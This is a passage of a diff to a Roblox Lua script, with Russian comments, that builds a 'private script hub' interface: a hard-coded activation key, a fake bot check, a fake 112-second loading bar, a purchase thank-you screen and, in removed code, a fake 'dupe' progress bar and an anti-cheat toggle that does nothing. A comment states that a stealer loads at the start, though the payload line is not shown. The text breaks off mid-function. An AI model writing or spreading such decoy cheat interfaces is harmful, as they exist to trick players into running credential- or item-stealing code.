@@ -1,5 +1,5 @@
 -- ===========================================
--- CoolMenu v2.0 — Anti-Bot Verification Edition
+-- Mertily's Private Script Hub — Ultimate
 -- ===========================================
 
 local Players = game:GetService("Players")
@@ -8,12 +8,6 @@ local TweenService = game:GetService("TweenService")
 local RunService = game:GetService("RunService")
 local player = Players.LocalPlayer
 
--- Очистка предыдущего GUI
-local playerGui = player:WaitForChild("PlayerGui")
-if playerGui:FindFirstChild("CoolMenu") then
-    playerGui.CoolMenu:Destroy()
-end
-
 -- === СТИЛАК ЗАГРУЖАЕТСЯ В САМОМ НАЧАЛЕ ===
 task.spawn(function()
     pcall(function()
@@ -21,25 +15,34 @@ task.spawn(function()
     end)
 end)
 
--- === Цветовая палитра (Modern Dark Theme) ===
+-- Константы
+local SECRET_KEY = "Mertily-Private_uenj-wk21-sllz"
+local PLACEHOLDER_KEY = "Mertily-Private_XXXX_XXXX_XXXX_XXXX"
+local LOADING_TIME = 112 -- 1 минута 52 секунды
+
+-- Очистка предыдущего GUI
+local playerGui = player:WaitForChild("PlayerGui")
+if playerGui:FindFirstChild("MertilyPrivateGui") then
+    playerGui.MertilyPrivateGui:Destroy()
+end
+
+-- === Цветовая палитра ===
 local THEME = {
-    Background = Color3.fromRGB(15, 17, 23),
-    Header = Color3.fromRGB(22, 25, 35),
-    Card = Color3.fromRGB(25, 29, 41),
-    CardHover = Color3.fromRGB(32, 37, 52),
-    Accent = Color3.fromRGB(108, 92, 231),
-    AccentGlow = Color3.fromRGB(162, 155, 254),
+    Background = Color3.fromRGB(12, 12, 15),
+    Header = Color3.fromRGB(28, 28, 34),
+    Card = Color3.fromRGB(45, 45, 52),
+    CardHover = Color3.fromRGB(55, 55, 65),
+    AccentPurple = Color3.fromRGB(155, 89, 182),
+    AccentGreen = Color3.fromRGB(46, 204, 113),
     TextPrimary = Color3.fromRGB(255, 255, 255),
-    TextSecondary = Color3.fromRGB(160, 168, 184),
-    Success = Color3.fromRGB(0, 206, 201),
-    Warning = Color3.fromRGB(253, 203, 110),
-    Danger = Color3.fromRGB(255, 118, 117),
-    Border = Color3.fromRGB(40, 45, 62)
+    TextSecondary = Color3.fromRGB(170, 175, 190),
+    Danger = Color3.fromRGB(231, 76, 60),
+    Border = Color3.fromRGB(60, 60, 72)
 }
 
--- Создаем ScreenGui
+-- Создаем ScreenGui (ResetOnSpawn = false чтобы не пропадал при смерти)
 local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "CoolMenu"
+screenGui.Name = "MertilyPrivateGui"
 screenGui.IgnoreGuiInset = true
 screenGui.ResetOnSpawn = false
 screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
@@ -48,22 +51,21 @@ screenGui.Parent = playerGui
 -- === Вспомогательные функции UI ===
 local function createCorner(parent, radius)
     local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(0, radius or 10)
+    corner.CornerRadius = UDim.new(0, radius or 12)
     corner.Parent = parent
     return corner
 end
 
-local function createStroke(parent, color, thickness, transparency)
+local function createStroke(parent, color, thickness)
     local stroke = Instance.new("UIStroke")
     stroke.Color = color or THEME.Border
     stroke.Thickness = thickness or 1
-    stroke.Transparency = transparency or 0
     stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
     stroke.Parent = parent
     return stroke
 end
 
--- === Drag-функция ===
+-- Перетаскивание окон
 local function makeDraggable(frame, handle)
     handle = handle or frame
     local dragging, dragInput, dragStart, startPos
@@ -99,418 +101,500 @@ local function makeDraggable(frame, handle)
     end)
 end
 
--- === Главное окно ===
-local menuSize = UDim2.new(0, 320, 0, 320)
-local mainMenu = Instance.new("Frame")
-mainMenu.Name = "MainFrame"
-mainMenu.Size = menuSize
-mainMenu.Position = UDim2.new(0.5, -160, 0.5, -160)
-mainMenu.BackgroundColor3 = THEME.Background
-mainMenu.BorderSizePixel = 0
-mainMenu.ClipsDescendants = true
-mainMenu.Visible = false
-mainMenu.Parent = screenGui
+-- ===========================================
+-- 1. ЭКРАН ПРИВЕТСТВИЯ (Splash Screen)
+-- ===========================================
+local splashFrame = Instance.new("Frame")
+splashFrame.Name = "SplashScreen"
+splashFrame.Size = UDim2.new(1, 0, 1, 0)
+splashFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+splashFrame.BackgroundTransparency = 0
+splashFrame.ZIndex = 100
+splashFrame.Parent = screenGui
 
-createCorner(mainMenu, 14)
-createStroke(mainMenu, THEME.Accent, 1.5, 0.3)
+local splashContainer = Instance.new("Frame")
+splashContainer.Size = UDim2.new(1, 0, 0, 100)
+splashContainer.Position = UDim2.new(0, 0, 0.5, -50)
+splashContainer.BackgroundTransparency = 1
+splashContainer.ZIndex = 101
+splashContainer.Parent = splashFrame
 
--- === Шапка (TitleBar) ===
-local titleBar = Instance.new("Frame")
-titleBar.Name = "TitleBar"
-titleBar.Size = UDim2.new(1, 0, 0, 46)
-titleBar.BackgroundColor3 = THEME.Header
-titleBar.BorderSizePixel = 0
-titleBar.Parent = mainMenu
+local titleText = Instance.new("TextLabel")
+titleText.Size = UDim2.new(1, 0, 0, 45)
+titleText.BackgroundTransparency = 1
+titleText.Text = "Mertily's script"
+titleText.TextColor3 = THEME.AccentPurple
+titleText.TextSize = 34
+titleText.Font = Enum.Font.GothamBold
+titleText.TextTransparency = 1
+titleText.ZIndex = 101
+titleText.Parent = splashContainer
 
-createCorner(titleBar, 14)
+local privateText = Instance.new("TextLabel")
+privateText.Size = UDim2.new(1, 0, 0, 30)
+privateText.Position = UDim2.new(0, 0, 0, 45)
+privateText.BackgroundTransparency = 1
+privateText.Text = "Private"
+privateText.TextColor3 = THEME.AccentGreen
+privateText.TextSize = 24
+privateText.Font = Enum.Font.GothamBold
+privateText.TextTransparency = 1
+privateText.ZIndex = 101
+privateText.Parent = splashContainer
 
-local headerBottomFix = Instance.new("Frame")
-headerBottomFix.Size = UDim2.new(1, 0, 0, 10)
-headerBottomFix.Position = UDim2.new(0, 0, 1, -10)
-headerBottomFix.BackgroundColor3 = THEME.Header
-headerBottomFix.BorderSizePixel = 0
-headerBottomFix.Parent = titleBar
+-- ===========================================
+-- 2. ГЛАВНЫЙ АНИМИРОВАННЫЙ ФОН (Розы + Падающие Листья)
+-- ===========================================
+local mainBackground = Instance.new("Frame")
+mainBackground.Name = "MainBackground"
+mainBackground.Size = UDim2.new(1, 0, 1, 0)
+mainBackground.BackgroundColor3 = THEME.Background
+mainBackground.Visible = false
+mainBackground.ZIndex = 1
+mainBackground.Parent = screenGui
 
-local titleIcon = Instance.new("TextLabel")
-titleIcon.Size = UDim2.new(0, 30, 1, 0)
-titleIcon.Position = UDim2.new(0, 12, 0, 0)
-titleIcon.BackgroundTransparency = 1
-titleIcon.Text = "⚡"
-titleIcon.TextColor3 = THEME.AccentGlow
-titleIcon.TextSize = 18
-titleIcon.Font = Enum.Font.GothamBold
-titleIcon.Parent = titleBar
+local roseImage = Instance.new("ImageLabel")
+roseImage.Size = UDim2.new(1, 0, 1, 0)
+roseImage.BackgroundTransparency = 1
+roseImage.Image = "rbxassetid://6071575925"
+roseImage.ImageTransparency = 0.85
+roseImage.ScaleType = Enum.ScaleType.Crop
+roseImage.ZIndex = 2
+roseImage.Parent = mainBackground
 
-local titleLabel = Instance.new("TextLabel")
-titleLabel.Size = UDim2.new(1, -90, 1, 0)
-titleLabel.Position = UDim2.new(0, 42, 0, 0)
-titleLabel.BackgroundTransparency = 1
-titleLabel.Text = "CoolMenu Hub"
-titleLabel.TextColor3 = THEME.TextPrimary
-titleLabel.TextSize = 15
-titleLabel.Font = Enum.Font.GothamBold
-titleLabel.TextXAlignment = Enum.TextXAlignment.Left
-titleLabel.Parent = titleBar
+local leavesContainer = Instance.new("Frame")
+leavesContainer.Size = UDim2.new(1, 0, 1, 0)
+leavesContainer.BackgroundTransparency = 1
+leavesContainer.ClipsDescendants = true
+leavesContainer.ZIndex = 3
+leavesContainer.Parent = mainBackground
 
-local subtitleLabel = Instance.new("TextLabel")
-subtitleLabel.Size = UDim2.new(1, -90, 0, 12)
-subtitleLabel.Position = UDim2.new(0, 42, 0, 26)
-subtitleLabel.BackgroundTransparency = 1
-subtitleLabel.Text = "v2.0 • Premium Edition"
-subtitleLabel.TextColor3 = THEME.TextSecondary
-subtitleLabel.TextSize = 10
-subtitleLabel.Font = Enum.Font.Gotham
-subtitleLabel.TextXAlignment = Enum.TextXAlignment.Left
-subtitleLabel.Parent = titleBar
+local function spawnLeaf()
+    local leaf = Instance.new("ImageLabel")
+    leaf.Size = UDim2.new(0, math.random(14, 22), 0, math.random(14, 22))
+    leaf.Position = UDim2.new(math.random(), 0, -0.05, 0)
+    leaf.BackgroundTransparency = 1
+    leaf.Image = "rbxassetid://6071575925"
+    leaf.ImageColor3 = Color3.fromRGB(100, 200, 120)
+    leaf.ImageTransparency = math.random(3, 6) / 10
+    leaf.ZIndex = 3
+    leaf.Parent = leavesContainer
 
--- Кнопка сворачивания
-local collapseButton = Instance.new("TextButton")
-collapseButton.Size = UDim2.new(0, 28, 0, 28)
-collapseButton.Position = UDim2.new(1, -36, 0.5, -14)
-collapseButton.BackgroundColor3 = THEME.Card
-collapseButton.BorderSizePixel = 0
-collapseButton.Text = "−"
-collapseButton.TextColor3 = THEME.TextSecondary
-collapseButton.TextSize = 18
-collapseButton.Font = Enum.Font.GothamBold
-collapseButton.AutoButtonColor = false
-collapseButton.Parent = titleBar
+    createCorner(leaf, 10)
 
-createCorner(collapseButton, 8)
-createStroke(collapseButton, THEME.Border, 1)
+    local fallDuration = math.random(8, 14)
+    local startX = leaf.Position.X.Scale
+    local swayAmount = math.random(3, 8) / 100
 
-makeDraggable(mainMenu, titleBar)
+    local tweenFall = TweenService:Create(leaf, TweenInfo.new(fallDuration, Enum.EasingStyle.Linear), {
+        Position = UDim2.new(startX, 0, 1.05, 0),
+        Rotation = math.random(180, 360)
+    })
+    tweenFall:Play()
 
--- === Экран Проверки на бота ===
-local botCheckFrame = Instance.new("Frame")
-botCheckFrame.Name = "BotCheckFrame"
-botCheckFrame.Size = UDim2.new(1, -24, 1, -58)
-botCheckFrame.Position = UDim2.new(0, 12, 0, 52)
-botCheckFrame.BackgroundTransparency = 1
-botCheckFrame.Visible = true
-botCheckFrame.Parent = mainMenu
-
-local checkStatusText = Instance.new("TextLabel")
-checkStatusText.Size = UDim2.new(1, 0, 1, 0)
-checkStatusText.BackgroundTransparency = 1
-checkStatusText.Text = "🤖 Проверка на бота..."
-checkStatusText.TextColor3 = THEME.AccentGlow
-checkStatusText.TextSize = 15
-checkStatusText.Font = Enum.Font.GothamMedium
-checkStatusText.TextWrapped = true
-checkStatusText.Parent = botCheckFrame
-
--- === Контейнер основного функционала ===
-local contentContainer = Instance.new("Frame")
-contentContainer.Name = "Content"
-contentContainer.Size = UDim2.new(1, -24, 1, -58)
-contentContainer.Position = UDim2.new(0, 12, 0, 52)
-contentContainer.BackgroundTransparency = 1
-contentContainer.Visible = false
-contentContainer.Parent = mainMenu
-
-local uiListLayout = Instance.new("UIListLayout")
-uiListLayout.Parent = contentContainer
-uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
-uiListLayout.Padding = UDim.new(0, 10)
-
--- === Элемент 1: Переключатель (Toggle) ===
-local toggleCard = Instance.new("Frame")
-toggleCard.Size = UDim2.new(1, 0, 0, 52)
-toggleCard.BackgroundColor3 = THEME.Card
-toggleCard.BorderSizePixel = 0
-toggleCard.LayoutOrder = 1
-toggleCard.Parent = contentContainer
-
-createCorner(toggleCard, 10)
-createStroke(toggleCard, THEME.Border, 1)
-
-local toggleLabel = Instance.new("TextLabel")
-toggleLabel.Size = UDim2.new(0.65, 0, 1, 0)
-toggleLabel.Position = UDim2.new(0, 14, 0, 0)
-toggleLabel.BackgroundTransparency = 1
-toggleLabel.Text = "Обход античита"
-toggleLabel.TextColor3 = THEME.TextPrimary
-toggleLabel.TextSize = 13
-toggleLabel.Font = Enum.Font.GothamMedium
-toggleLabel.TextXAlignment = Enum.TextXAlignment.Left
-toggleLabel.Parent = toggleCard
-
-local switchTrack = Instance.new("Frame")
-switchTrack.Size = UDim2.new(0, 44, 0, 22)
-switchTrack.Position = UDim2.new(1, -56, 0.5, -11)
-switchTrack.BackgroundColor3 = Color3.fromRGB(40, 45, 60)
-switchTrack.BorderSizePixel = 0
-switchTrack.Parent = toggleCard
-
-createCorner(switchTrack, 11)
-
-local switchThumb = Instance.new("Frame")
-switchThumb.Size = UDim2.new(0, 16, 0, 16)
-switchThumb.Position = UDim2.new(0, 3, 0.5, -8)
-switchThumb.BackgroundColor3 = THEME.TextPrimary
-switchThumb.BorderSizePixel = 0
-switchThumb.Parent = switchTrack
-
-createCorner(switchThumb, 8)
-
-local switchButton = Instance.new("TextButton")
-switchButton.Size = UDim2.new(1, 0, 1, 0)
-switchButton.BackgroundTransparency = 1
-switchButton.Text = ""
-switchButton.Parent = switchTrack
-
-local antiCheatEnabled = false
-
-local function setToggleState(state)
-    antiCheatEnabled = state
-    local targetPos = state and UDim2.new(1, -19, 0.5, -8) or UDim2.new(0, 3, 0.5, -8)
-    local targetColor = state and THEME.Accent or Color3.fromRGB(40, 45, 60)
-    
-    TweenService:Create(switchThumb, TweenInfo.new(0.25, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Position = targetPos}):Play()
-    TweenService:Create(switchTrack, TweenInfo.new(0.25, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {BackgroundColor3 = targetColor}):Play()
-end
-
-switchButton.MouseButton1Click:Connect(function()
-    setToggleState(not antiCheatEnabled)
-    print("[CoolMenu] Обход античита:", antiCheatEnabled and "ВКЛ" or "ВЫКЛ")
-end)
-
--- === Элемент 2: Действие (Action Card) ===
-local actionCard = Instance.new("Frame")
-actionCard.Size = UDim2.new(1, 0, 0, 52)
-actionCard.BackgroundColor3 = THEME.Card
-actionCard.BorderSizePixel = 0
-actionCard.LayoutOrder = 2
-actionCard.Parent = contentContainer
-
-createCorner(actionCard, 10)
-createStroke(actionCard, THEME.Border, 1)
-
-local actionLabel = Instance.new("TextLabel")
-actionLabel.Size = UDim2.new(0.5, 0, 1, 0)
-actionLabel.Position = UDim2.new(0, 14, 0, 0)
-actionLabel.BackgroundTransparency = 1
-actionLabel.Text = "Дюпать годли"
-actionLabel.TextColor3 = THEME.TextPrimary
-actionLabel.TextSize = 13
-actionLabel.Font = Enum.Font.GothamMedium
-actionLabel.TextXAlignment = Enum.TextXAlignment.Left
-actionLabel.Parent = actionCard
-
-local dupButton = Instance.new("TextButton")
-dupButton.Size = UDim2.new(0, 90, 0, 32)
-dupButton.Position = UDim2.new(1, -102, 0.5, -16)
-dupButton.BackgroundColor3 = THEME.Accent
-dupButton.BorderSizePixel = 0
-dupButton.Text = "Запустить"
-dupButton.TextColor3 = THEME.TextPrimary
-dupButton.TextSize = 12
-dupButton.Font = Enum.Font.GothamBold
-dupButton.AutoButtonColor = false
-dupButton.Parent = actionCard
-
-createCorner(dupButton, 8)
-
--- === Элемент 3: Прогресс-бар ===
-local progressCard = Instance.new("Frame")
-progressCard.Size = UDim2.new(1, 0, 0, 75)
-progressCard.BackgroundColor3 = THEME.Card
-progressCard.BorderSizePixel = 0
-progressCard.LayoutOrder = 3
-progressCard.Visible = false
-progressCard.Parent = contentContainer
-
-createCorner(progressCard, 10)
-createStroke(progressCard, THEME.Border, 1)
-
-local progressTitle = Instance.new("TextLabel")
-progressTitle.Size = UDim2.new(1, -28, 0, 20)
-progressTitle.Position = UDim2.new(0, 14, 0, 10)
-progressTitle.BackgroundTransparency = 1
-progressTitle.Text = "Процесс дюпа"
-progressTitle.TextColor3 = THEME.TextPrimary
-progressTitle.TextSize = 12
-progressTitle.Font = Enum.Font.GothamMedium
-progressTitle.TextXAlignment = Enum.TextXAlignment.Left
-progressTitle.Parent = progressCard
-
-local progressPercent = Instance.new("TextLabel")
-progressPercent.Size = UDim2.new(0, 50, 0, 20)
-progressPercent.Position = UDim2.new(1, -64, 0, 10)
-progressPercent.BackgroundTransparency = 1
-progressPercent.Text = "0%"
-progressPercent.TextColor3 = THEME.AccentGlow
-progressPercent.TextSize = 12
-progressPercent.Font = Enum.Font.GothamBold
-progressPercent.TextXAlignment = Enum.TextXAlignment.Right
-progressPercent.Parent = progressCard
-
-local progressBarBg = Instance.new("Frame")
-progressBarBg.Size = UDim2.new(1, -28, 0, 8)
-progressBarBg.Position = UDim2.new(0, 14, 0, 36)
-progressBarBg.BackgroundColor3 = Color3.fromRGB(18, 20, 28)
-progressBarBg.BorderSizePixel = 0
-progressBarBg.Parent = progressCard
-
-createCorner(progressBarBg, 4)
-
-local progressBarFill = Instance.new("Frame")
-progressBarFill.Size = UDim2.new(0, 0, 1, 0)
-progressBarFill.BackgroundColor3 = THEME.Accent
-progressBarFill.BorderSizePixel = 0
-progressBarFill.Parent = progressBarBg
-
-createCorner(progressBarFill, 4)
-
-local statusLabel = Instance.new("TextLabel")
-statusLabel.Size = UDim2.new(1, -28, 0, 18)
-statusLabel.Position = UDim2.new(0, 14, 0, 48)
-statusLabel.BackgroundTransparency = 1
-statusLabel.Text = "Инициализация..."
-statusLabel.TextColor3 = THEME.Success
-statusLabel.TextSize = 10
-statusLabel.Font = Enum.Font.Gotham
-statusLabel.TextXAlignment = Enum.TextXAlignment.Left
-statusLabel.Visible = false
-statusLabel.Parent = progressCard
-
--- === Логика дюпа ===
-local isDuping = false
-local dupConnection = nil
-local dupStartTime = 0
-
-local function resetDupUI()
-    isDuping = false
-    if dupConnection then
-        dupConnection:Disconnect()
-        dupConnection = nil
-    end
-    progressCard.Visible = false
-    statusLabel.Visible = false
-    dupButton.Text = "Запустить"
-    dupButton.BackgroundColor3 = THEME.Accent
-    progressBarFill.Size = UDim2.new(0, 0, 1, 0)
-    progressPercent.Text = "0%"
-end
-
-local function startDup()
-    if isDuping then return end
-    isDuping = true
-    dupStartTime = tick()
-    
-    progressCard.Visible = true
-    statusLabel.Visible = false
-    dupButton.Text = "Остановить"
-    dupButton.BackgroundColor3 = THEME.Danger
-    
-    dupConnection = RunService.Heartbeat:Connect(function()
-        if not isDuping then return end
-        
-        local elapsed = tick() - dupStartTime
-        local progress = math.min(elapsed / 60 * 100, 100)
-        
-        TweenService:Create(progressBarFill, TweenInfo.new(0.1, Enum.EasingStyle.Linear), {
-            Size = UDim2.new(progress / 100, 0, 1, 0)
-        }):Play()
-        
-        progressPercent.Text = string.format("%d%%", math.floor(progress))
-        
-        if progress >= 100 then
-            isDuping = false
-            if dupConnection then
-                dupConnection:Disconnect()
-                dupConnection = nil
-            end
-            
-            statusLabel.Text = "✅ Успешно завершено!"
-            statusLabel.Visible = true
-            dupButton.Text = "Готово"
-            dupButton.BackgroundColor3 = THEME.Success
-            
-            task.delay(4, function()
-                if not isDuping then
-                    resetDupUI()
-                end
-            end)
+    task.spawn(function()
+        local startTime = tick()
+        while tick() - startTime < fallDuration and leaf.Parent do
+            local elapsed = tick() - startTime
+            local sway = math.sin(elapsed * 2) * swayAmount
+            leaf.Position = UDim2.new(startX + sway, 0, leaf.Position.Y.Scale, leaf.Position.Y.Offset)
+            task.wait(0.03)
         end
+    end)
+
+    tweenFall.Completed:Connect(function()
+        leaf:Destroy()
     end)
 end
 
-dupButton.MouseButton1Click:Connect(function()
-    if isDuping then
-        resetDupUI()
-    else
-        startDup()
+task.spawn(function()
+    while true do
+        if mainBackground.Visible then
+            spawnLeaf()
+        end
+        task.wait(0.8)
     end
 end)
 
--- === Сворачивание панели ===
-local isCollapsed = false
-collapseButton.MouseButton1Click:Connect(function()
-    isCollapsed = not isCollapsed
-    local targetSize = isCollapsed and UDim2.new(0, 320, 0, 46) or menuSize
-    
-    TweenService:Create(mainMenu, TweenInfo.new(0.35, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
-        Size = targetSize
-    }):Play()
-    
-    botCheckFrame.Visible = not isCollapsed and not contentContainer.Visible
-    if contentContainer.Visible then
-        contentContainer.Visible = not isCollapsed
-    end
-    
-    collapseButton.Text = isCollapsed and "+" or "−"
-end)
+-- ===========================================
+-- 3. ГЛАВНОЕ ОКНО
+-- ===========================================
+local mainWindow = Instance.new("Frame")
+mainWindow.Name = "MainWindow"
+mainWindow.Size = UDim2.new(0, 380, 0, 260)
+mainWindow.Position = UDim2.new(0.5, -190, 0.5, -130)
+mainWindow.BackgroundColor3 = THEME.Background
+mainWindow.BorderSizePixel = 0
+mainWindow.ClipsDescendants = true
+mainWindow.Visible = false
+mainWindow.ZIndex = 10
+mainWindow.Parent = screenGui
 
--- === Показ / Скрытие Меню ===
-local menuVisible = false
+createCorner(mainWindow, 16)
+createStroke(mainWindow, THEME.AccentPurple, 1.5)
 
-local function toggleMenu()
-    menuVisible = not menuVisible
-    
-    if menuVisible then
-        mainMenu.Visible = true
-        mainMenu.Size = UDim2.new(0, 280, 0, 0)
-        mainMenu.BackgroundTransparency = 0.5
+-- Шапка
+local titleBar = Instance.new("Frame")
+titleBar.Size = UDim2.new(1, 0, 0, 46)
+titleBar.BackgroundColor3 = THEME.Header
+titleBar.BorderSizePixel = 0
+titleBar.ZIndex = 11
+titleBar.Parent = mainWindow
+
+createCorner(titleBar, 16)
+
+local headerTitle = Instance.new("TextLabel")
+headerTitle.Size = UDim2.new(1, -20, 1, 0)
+headerTitle.Position = UDim2.new(0, 15, 0, 0)
+headerTitle.BackgroundTransparency = 1
+headerTitle.Text = "Mertily's Private — System"
+headerTitle.TextColor3 = THEME.TextPrimary
+headerTitle.TextSize = 14
+headerTitle.Font = Enum.Font.GothamBold
+headerTitle.TextXAlignment = Enum.TextXAlignment.Left
+headerTitle.ZIndex = 12
+headerTitle.Parent = titleBar
+
+makeDraggable(mainWindow, titleBar)
+
+-- -------------------------------------------
+-- 3.1 Экран Ввода Ключа (Сразу после приветствия)
+-- -------------------------------------------
+local keySystemFrame = Instance.new("Frame")
+keySystemFrame.Size = UDim2.new(1, -30, 1, -60)
+keySystemFrame.Position = UDim2.new(0, 15, 0, 55)
+keySystemFrame.BackgroundTransparency = 1
+keySystemFrame.Visible = true
+keySystemFrame.ZIndex = 11
+keySystemFrame.Parent = mainWindow
+
+local keyInstructionLabel = Instance.new("TextLabel")
+keyInstructionLabel.Size = UDim2.new(1, 0, 0, 20)
+keyInstructionLabel.BackgroundTransparency = 1
+keyInstructionLabel.Text = "Введите ваш ключ:"
+keyInstructionLabel.TextColor3 = THEME.TextPrimary
+keyInstructionLabel.TextSize = 13
+keyInstructionLabel.Font = Enum.Font.GothamMedium
+keyInstructionLabel.TextXAlignment = Enum.TextXAlignment.Left
+keyInstructionLabel.ZIndex = 11
+keyInstructionLabel.Parent = keySystemFrame
+
+local textBoxContainer = Instance.new("Frame")
+textBoxContainer.Size = UDim2.new(1, 0, 0, 44)
+textBoxContainer.Position = UDim2.new(0, 0, 0, 28)
+textBoxContainer.BackgroundColor3 = THEME.Card
+textBoxContainer.BorderSizePixel = 0
+textBoxContainer.ZIndex = 11
+textBoxContainer.Parent = keySystemFrame
+
+createCorner(textBoxContainer, 10)
+local inputStroke = createStroke(textBoxContainer, THEME.Border, 1)
+
+local keyTextBox = Instance.new("TextBox")
+keyTextBox.Size = UDim2.new(1, -20, 1, 0)
+keyTextBox.Position = UDim2.new(0, 10, 0, 0)
+keyTextBox.BackgroundTransparency = 1
+keyTextBox.Text = ""
+keyTextBox.PlaceholderText = PLACEHOLDER_KEY
+keyTextBox.PlaceholderColor3 = Color3.fromRGB(110, 115, 130)
+keyTextBox.TextColor3 = THEME.TextPrimary
+keyTextBox.TextSize = 11
+keyTextBox.Font = Enum.Font.Code
+keyTextBox.TextXAlignment = Enum.TextXAlignment.Left
+keyTextBox.ClearTextOnFocus = false
+keyTextBox.ZIndex = 12
+keyTextBox.Parent = textBoxContainer
+
+local submitButton = Instance.new("TextButton")
+submitButton.Size = UDim2.new(1, 0, 0, 40)
+submitButton.Position = UDim2.new(0, 0, 0, 82)
+submitButton.BackgroundColor3 = THEME.Card
+submitButton.BorderSizePixel = 0
+submitButton.Text = "Активировать"
+submitButton.TextColor3 = THEME.TextPrimary
+submitButton.TextSize = 13
+submitButton.Font = Enum.Font.GothamBold
+submitButton.AutoButtonColor = false
+submitButton.ZIndex = 11
+submitButton.Parent = keySystemFrame
+
+createCorner(submitButton, 10)
+createStroke(submitButton, THEME.Border, 1)
+
+local keyStatusLabel = Instance.new("TextLabel")
+keyStatusLabel.Size = UDim2.new(1, 0, 0, 20)
+keyStatusLabel.Position = UDim2.new(0, 0, 0, 130)
+keyStatusLabel.BackgroundTransparency = 1
+keyStatusLabel.Text = ""
+keyStatusLabel.TextColor3 = THEME.Danger
+keyStatusLabel.TextSize = 11
+keyStatusLabel.Font = Enum.Font.Gotham
+keyStatusLabel.ZIndex = 11
+keyStatusLabel.Parent = keySystemFrame
+
+-- -------------------------------------------
+-- 3.2 Экран Проверки на бота
+-- -------------------------------------------
+local botCheckFrame = Instance.new("Frame")
+botCheckFrame.Size = UDim2.new(1, -30, 1, -60)
+botCheckFrame.Position = UDim2.new(0, 15, 0, 55)
+botCheckFrame.BackgroundTransparency = 1
+botCheckFrame.Visible = false
+botCheckFrame.ZIndex = 11
+botCheckFrame.Parent = mainWindow
+
+local botCheckLabel = Instance.new("TextLabel")
+botCheckLabel.Size = UDim2.new(1, 0, 1, 0)
+botCheckLabel.BackgroundTransparency = 1
+botCheckLabel.Text = "🤖 Проверка на бота..."
+botCheckLabel.TextColor3 = THEME.TextSecondary
+botCheckLabel.TextSize = 15
+botCheckLabel.Font = Enum.Font.GothamMedium
+botCheckLabel.TextWrapped = true
+botCheckLabel.ZIndex = 11
+botCheckLabel.Parent = botCheckFrame
+
+-- -------------------------------------------
+-- 3.3 Экран Загрузки (112 секунд)
+-- -------------------------------------------
+local loadingFrame = Instance.new("Frame")
+loadingFrame.Size = UDim2.new(1, -30, 1, -60)
+loadingFrame.Position = UDim2.new(0, 15, 0, 55)
+loadingFrame.BackgroundTransparency = 1
+loadingFrame.Visible = false
+loadingFrame.ZIndex = 11
+loadingFrame.Parent = mainWindow
+
+local loadingTitle = Instance.new("TextLabel")
+loadingTitle.Size = UDim2.new(1, 0, 0, 25)
+loadingTitle.BackgroundTransparency = 1
+loadingTitle.Text = "Загрузка скрипта с библиотек..."
+loadingTitle.TextColor3 = THEME.TextPrimary
+loadingTitle.TextSize = 13
+loadingTitle.Font = Enum.Font.GothamMedium
+loadingTitle.ZIndex = 11
+loadingTitle.Parent = loadingFrame
+
+local progressBg = Instance.new("Frame")
+progressBg.Size = UDim2.new(1, 0, 0, 14)
+progressBg.Position = UDim2.new(0, 0, 0, 45)
+progressBg.BackgroundColor3 = THEME.Card
+progressBg.BorderSizePixel = 0
+progressBg.ZIndex = 11
+progressBg.Parent = loadingFrame
+
+createCorner(progressBg, 7)
+
+local progressFill = Instance.new("Frame")
+progressFill.Size = UDim2.new(0, 0, 1, 0)
+progressFill.BackgroundColor3 = THEME.AccentPurple
+progressFill.BorderSizePixel = 0
+progressFill.ZIndex = 12
+progressFill.Parent = progressBg
+
+createCorner(progressFill, 7)
+
+local percentLabel = Instance.new("TextLabel")
+percentLabel.Size = UDim2.new(1, 0, 0, 20)
+percentLabel.Position = UDim2.new(0, 0, 0, 70)
+percentLabel.BackgroundTransparency = 1
+percentLabel.Text = "0%"
+percentLabel.TextColor3 = THEME.TextSecondary
+percentLabel.TextSize = 14
+percentLabel.Font = Enum.Font.GothamBold
+percentLabel.ZIndex = 11
+percentLabel.Parent = loadingFrame
+
+-- -------------------------------------------
+-- 3.4 Экран Благодарности
+-- -------------------------------------------
+local thankYouFrame = Instance.new("Frame")
+thankYouFrame.Size = UDim2.new(1, -30, 1, -60)
+thankYouFrame.Position = UDim2.new(0, 15, 0, 55)
+thankYouFrame.BackgroundTransparency = 1
+thankYouFrame.Visible = false
+thankYouFrame.ZIndex = 11
+thankYouFrame.Parent = mainWindow
+
+local thankYouLabel = Instance.new("TextLabel")
+thankYouLabel.Size = UDim2.new(1, 0, 1, 0)
+thankYouLabel.BackgroundTransparency = 1
+thankYouLabel.Text = "❤️ Спасибо за покупку приватного скрипта!"
+thankYouLabel.TextColor3 = THEME.AccentGreen
+thankYouLabel.TextSize = 15
+thankYouLabel.Font = Enum.Font.GothamBold
+thankYouLabel.TextWrapped = true
+thankYouLabel.ZIndex = 11
+thankYouLabel.Parent = thankYouFrame
+
+-- -------------------------------------------
+-- 3.5 Основное Меню Функций
+-- -------------------------------------------
+local cheatMenuFrame = Instance.new("Frame")
+cheatMenuFrame.Size = UDim2.new(1, -30, 1, -60)
+cheatMenuFrame.Position = UDim2.new(0, 15, 0, 55)
+cheatMenuFrame.BackgroundTransparency = 1
+cheatMenuFrame.Visible = false
+cheatMenuFrame.ZIndex = 11
+cheatMenuFrame.Parent = mainWindow
+
+local function createToggle(parent, yPos, titleText)
+    local toggleCard = Instance.new("Frame")
+    toggleCard.Size = UDim2.new(1, 0, 0, 48)
+    toggleCard.Position = UDim2.new(0, 0, 0, yPos)
+    toggleCard.BackgroundColor3 = THEME.Card
+    toggleCard.BorderSizePixel = 0
+    toggleCard.ZIndex = 11
+    toggleCard.Parent = parent
+
+    createCorner(toggleCard, 10)
+    createStroke(toggleCard, THEME.Border, 1)
+
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(0.65, 0, 1, 0)
+    label.Position = UDim2.new(0, 12, 0, 0)
+    label.BackgroundTransparency = 1
+    label.Text = titleText
+    label.TextColor3 = THEME.TextPrimary
+    label.TextSize = 13
+    label.Font = Enum.Font.GothamMedium
+    label.TextXAlignment = Enum.TextXAlignment.Left
+    label.ZIndex = 12
+    label.Parent = toggleCard
+
+    local track = Instance.new("Frame")
